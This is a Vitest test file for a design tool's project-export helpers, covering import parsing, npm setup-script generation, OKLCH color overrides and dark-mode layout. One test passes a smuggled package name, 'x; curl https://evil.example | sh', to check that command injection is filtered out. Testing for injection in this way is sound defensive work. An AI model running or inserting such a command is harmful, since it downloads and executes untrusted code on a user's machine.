import { describe, expect, it } from "vitest";
import packageJson from "@/package.json";
import {
  collectImportSpecifiers,
  generateLayoutCode,
  generatePaletteAlphaUtilityOverrides,
  generateSetupScript,
} from "@/utils/export-project";

describe("export dependency detection", () => {
  it("reads real import statements, not text that mentions `from`", () => {
    const code = `"use client";
import * as React from "react";
import {
  Check,
  X,
} from "lucide-react";
import type { ReactNode } from "react";
import "./globals.css";
export { cn } from "@/lib/utils";

export default function Testimonial() {
  const note = 'Imported from "Figma"';
  return <blockquote>Straight from "the team": we ship weekly.</blockquote>;
}`;
    expect(collectImportSpecifiers(code)).toEqual([
      "react",
      "lucide-react",
      "react",
      "./globals.css",
      "@/lib/utils",
    ]);
  });

  it("installs only packages Luova ships, pinned and quoted", () => {
    const script = generateSetupScript([
      "framer-motion",
      "@radix-ui/react-dialog",
      "lucide-react/dynamic",
      "react",
      "@/lib/utils",
      "the team",
      "left-pad",
      "x; curl https://evil.example | sh",
    ]);
    const install = script.match(/execSync\('npm install ([^']*)'/)?.[1] ?? "";
    const deps = packageJson.dependencies as Record<string, string>;

    expect(install).toContain(`"framer-motion@${deps["framer-motion"]}"`);
    expect(install).toContain(
      `"@radix-ui/react-dialog@${deps["@radix-ui/react-dialog"]}"`
    );
    expect(install).toContain(`"lucide-react@${deps["lucide-react"]}"`);
    expect(install).toContain('"clsx@');
    expect(install).not.toMatch(/"react@|the|team|left-pad|curl|;/);
  });

  it("installs only versions that existed at export time, pinned exactly", () => {
    const script = generateSetupScript([], new Date("2026-10-21T12:00:00Z"));
    expect(script).toContain("npm_config_before: '2026-10-21T12:00:00.000Z'");
    expect(script).toContain("npm_config_save_exact: 'true'");
    expect(script.match(/env: npmEnv/g)).toHaveLength(2);
    expect(script).toContain(
      "fs.writeFileSync('.npmrc', 'save-exact=true\\n')"
    );
    // The generated file must be valid JavaScript.
    expect(() => new Function("require", "process", script)).not.toThrow();
  });

  it("scaffolds with the pinned Next.js version, non-interactively", () => {
    const script = generateSetupScript([]);
    const nextVersion = packageJson.dependencies.next.replace(/^[\^~]/, "");
    expect(script).toContain(`create-next-app@${nextVersion} `);
    expect(script).not.toContain("@latest");
    expect(script).toContain("--disable-git --yes");
  });
});

describe("generatePaletteAlphaUtilityOverrides", () => {
  it("emits direct OKLCH alpha rules for palette opacity utilities", () => {
    const css = generatePaletteAlphaUtilityOverrides([
      'const styles = "bg-blue-100 dark:bg-blue-900/30 text-red-700/80 border-green-900/20";',
    ]);

    expect(css).toContain(
      ".dark .dark\\:bg-blue-900\\/30, .dark.dark\\:bg-blue-900\\/30"
    );
    expect(css).toContain("background-color: oklch(37.9% 0.146 265.522 / 0.3)");
    expect(css).toContain("color: oklch(50.5% 0.213 27.518 / 0.8)");
    expect(css).toContain("border-color: oklch(39.3% 0.095 152.535 / 0.2)");
    expect(css).not.toContain("color-mix(");
  });
});

describe("export layout color mode", () => {
  it("opens the exported app in dark mode when the theme was in dark mode", () => {
    const layout = generateLayoutCode("dark");
    expect(layout).toContain(
      '<html lang="en" className="dark" style={{ colorScheme: "dark" }} suppressHydrationWarning>'
    );
  });

  it("leaves the html element unclassed in light mode", () => {
    const layout = generateLayoutCode("light");
    expect(layout).toContain('<html lang="en" suppressHydrationWarning>');
    expect(layout).not.toContain("dark");
  });
});
